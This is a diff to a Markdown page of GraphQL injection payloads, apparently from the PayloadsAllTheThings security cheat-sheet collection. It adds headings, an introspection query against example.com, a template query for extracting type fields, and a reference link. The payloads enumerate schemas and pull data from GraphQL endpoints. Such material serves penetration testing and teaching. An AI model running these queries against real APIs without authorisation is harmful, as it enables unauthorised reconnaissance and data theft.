@@ -4,10 +4,10 @@
 
 ## Exploit
 
-Identify an injection point
+### Identify an injection point
 
-```javascript
-?param={__schema{types{name}}}
+```js
+example.com/graphql?query={__schema{types{name}}}
 ```
 Check if errors are visible
 
@@ -17,7 +17,15 @@ Check if errors are visible
 ?param={thisdefinitelydoesnotexist}
 ```
 
-Enumerate Database Schema with the following GraphQL query
+### Extract data
+
+```js
+example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
+```
+
+![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)
+
+### Enumerate Database Schema with the following GraphQL query
 
 ```javascript
 fragment FullType on __Type {
@@ -114,10 +122,9 @@ query IntrospectionQuery {
     }
   }
 }
-
 ```
 
-Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type
+### Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type
 
 ```javascript
 {__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
@@ -127,4 +134,4 @@ Enumerate the definition of interesting types using the following GraphQL query,
 
 * [Introduction to GraphQL](https://graphql.org/learn/)
 * [GraphQL Introspection](https://graphql.org/learn/introspection/)
-
+* [API Hacking GraphQL - @ghostlulz - jun 8, 2019](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
